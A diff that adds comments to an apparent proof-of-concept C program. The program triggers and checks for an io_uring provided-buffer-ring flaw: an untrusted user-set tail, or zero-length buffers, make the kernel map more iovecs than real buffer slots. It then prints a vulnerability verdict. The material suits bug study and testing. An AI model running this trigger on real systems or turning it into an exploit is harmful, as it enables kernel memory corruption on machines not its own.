@@ -152,6 +152,14 @@ int main(int argc, char *argv[])
 
 	capacity = (size_t)RING_ENTRIES * BUF_LEN;
 
+	/*
+	 * tail-delta: ask for far more than the ring can legitimately supply.
+	 *   max_len = 6400, buf_len = 64 -> needed = 100, nr_avail = 100,
+	 *   so 100 iovecs get mapped onto 2 physical slots.
+	 * zero-len: 2 * BUF_LEN is the smallest max_len that still makes
+	 *   needed = 2, which is what forces nr_avail(2) > nr_iovs(1) and
+	 *   therefore fires the EXPAND branch. Do not lower it.
+	 */
 	payload_len = zero_len_mode ? (size_t)2 * BUF_LEN
 				    : (size_t)TAIL_DELTA * BUF_LEN;
 	sqe_len = (argc > 2) ? (size_t)strtoul(argv[2], NULL, 0) : payload_len;
@@ -164,6 +172,7 @@ int main(int argc, char *argv[])
 	printf("[*] sqe->len      : %zu  (drives sel.val -> arg.max_len)\n",
 	       sqe_len);
 
+	/* [1] Stream socketpair with data already queued -> inline issue. */
 	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp))
 		die("socketpair");
 
@@ -174,12 +183,18 @@ int main(int argc, char *argv[])
 		die("write(payload)");
 	printf("[*] queued        : %zu bytes on the socket\n", payload_len);
 
+	/* [2] io_uring instance. */
 	ret = io_uring_queue_init(8, &ring, 0);
 	if (ret) {
 		errno = -ret;
 		die("io_uring_queue_init");
 	}
 
+	/*
+	 * [3] Provided-buffer ring backed by OUR OWN page: the supported
+	 *     IORING_MEM_REGION_TYPE_USER mode. This is exactly why br->tail
+	 *     is user-writable at any instant and must never be trusted.
+	 */
 	br = mmap(NULL, page, PROT_READ | PROT_WRITE,
 		  MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (br == MAP_FAILED)
@@ -203,6 +218,11 @@ int main(int argc, char *argv[])
 	printf("[*] pbuf ring     : registered, bgid=%u, br=%p\n", BGID,
 	       (void *)br);
 
+	/*
+	 * [4] Publish RING_ENTRIES legitimate buffers. Each is pre-filled
+	 *     with a 0xAA sentinel so an overwrite is visible.
+	 *     zero-len mode leaves bufs[1..].len == 0.
+	 */
 	for (i = 0; i < RING_ENTRIES; i++) {
 		real_buf[i] = xzalloc(BUF_LEN);
 		memset(real_buf[i], 0xAA, BUF_LEN);
@@ -212,6 +232,18 @@ int main(int argc, char *argv[])
 		br->bufs[i].len = (zero_len_mode && i > 0) ? 0 : BUF_LEN;
 	}
 
+	/*
+	 * [5] The trigger.
+	 *
+	 * tail-delta: publish tail = TAIL_DELTA although only RING_ENTRIES
+	 *             buffers exist. bl->head is 0, so the kernel computes
+	 *             nr_avail = min_t(__u16, tail - head, UIO_MAXIOV) = 100
+	 *             and maps 100 iovecs onto 2 physical slots.
+	 * zero-len  : publish an honest tail, but leave bufs[1].len == 0. The
+	 *             pre-loop check rejects only a zero-length FIRST buffer;
+	 *             deeper zero-length buffers are appended as iov_len == 0
+	 *             and still consume a head slot.
+	 */
 	tail_to_publish = zero_len_mode ? RING_ENTRIES : TAIL_DELTA;
 	__atomic_store_n(&br->tail, (__u16)tail_to_publish, __ATOMIC_RELEASE);
 	printf("[*] published     : tail=%u, head=0 -> kernel believes %u "
@@ -219,6 +251,7 @@ int main(int argc, char *argv[])
 	printf("[*] legitimate    : %u buffers, %zu bytes of distinct "
 	       "capacity\n", RING_ENTRIES, capacity);
 
+	/* [6] Bundled recv with buffer selection. */
 	sqe = io_uring_get_sqe(&ring);
 	if (!sqe)
 		die("io_uring_get_sqe");
@@ -244,6 +277,7 @@ int main(int argc, char *argv[])
 	       cqe->res, cqe->flags, cqe->flags >> IORING_CQE_BUFFER_SHIFT);
 	io_uring_cqe_seen(&ring, cqe);
 
+	/* [7] Verdict. */
 	printf("\n--- verdict ---\n");
 
 	if (cqe->res < 0) {
@@ -265,6 +299,10 @@ int main(int argc, char *argv[])
 		       "(IORING_REGISTER_PBUF_STATUS opcode mismatch)\n");
 
 	if (zero_len_mode) {
+		/*
+		 * Honest expectation: bufs[1] carried zero bytes, so it must
+		 * not be consumed. head should advance by 1, not 2.
+		 */
 		if (head_ok && head > 1) {
 			printf("[!] VULNERABLE: %u ring slots consumed while "
 			       "only bufs[0] carried data.\n", head);
@@ -282,6 +320,14 @@ int main(int argc, char *argv[])
 		return head_ok ? 3 : 4;
 	}
 
+	/*
+	 * The invariant a correct implementation must hold:
+	 *   bytes transferred <= distinct buffer capacity offered by the ring
+	 * Capacity here is RING_ENTRIES * BUF_LEN = 128 bytes. Anything more
+	 * means the same physical slots were mapped repeatedly, i.e. the
+	 * kernel trusted a user-supplied tail without validating it against
+	 * bl->mask + 1.
+	 */
 	printf("[*] bytes transferred       : %d\n", cqe->res);
 	printf("[*] distinct buffer capacity  : %zu\n", capacity);
 
